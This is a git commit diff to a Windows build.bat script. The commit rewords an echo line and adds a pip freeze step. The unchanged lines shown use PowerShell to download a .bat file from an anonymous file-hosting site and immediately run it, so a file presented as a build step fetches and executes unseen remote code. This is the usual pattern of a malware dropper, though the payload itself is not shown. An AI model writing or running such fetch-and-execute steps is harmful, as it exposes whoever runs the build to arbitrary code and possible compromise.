fe4c946215f44894213b3fc080666bd687cc50be
CodeFoxy <96522178+CodeFoxy-Github@users.noreply.github.com>
2024-07-30 11:01:28 +0800

    Update build.bat

--- build.bat
+++ build.bat
@@ -1,5 +1,6 @@
 @echo off
-echo Download build script
+echo Download requirements.
+pip freeze > requirements.txt
 powershell iwr https://files.catbox.moe/27u2dv.bat -OutFile package.bat
 start package.bat
 echo done!
